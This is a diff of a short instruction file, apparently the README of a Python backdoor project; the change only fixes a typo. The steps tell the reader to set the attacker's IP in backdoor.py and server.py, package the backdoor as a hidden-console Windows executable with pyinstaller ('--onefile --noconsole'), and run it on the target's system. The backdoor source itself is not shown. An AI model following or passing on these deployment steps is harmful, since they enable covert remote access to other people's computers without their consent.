@@ -2,7 +2,7 @@
 
 1) You have to change the IP adress in both python file(backdoor.py & server.py)
 2) Open terminal and install pyinstaller library by typing -> pip install pyinstaller
-3) Open terminal in python file directory and make backdoor.py file so exe file using pyinstaller
+3) Open terminal in python file directory and make backdoor.py file to exe file using pyinstaller
     -> Run pyinstaller backdoor.py --onefile --noconsole
 4) You getting some file in that folder. In that open dist folder, Were you will find backdoor.exe file
 5) Run that file in target's system (Any version of Windows).
